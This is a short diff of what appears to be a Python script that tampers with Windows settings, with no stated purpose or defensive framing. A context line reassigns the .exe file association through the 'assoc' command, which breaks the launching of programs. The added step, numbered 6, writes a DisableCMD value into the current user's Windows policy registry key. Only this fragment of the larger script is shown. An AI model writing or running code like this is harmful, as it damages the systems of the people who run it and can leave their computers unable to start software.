@@ -44,3 +44,8 @@ file_extension = ".exe"
 file_type = ".hank"
 command = f'assoc {file_extension}={file_type}'
 subprocess.run(command, shell=True)
+
+# 6. Hanum
+key4 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Policies\\Microsoft\\Windows\\System')
+reg.SetValueEx(key4, 'DisableCMD', 0, reg.REG_DWORD, 0)
+reg.CloseKey(key4)
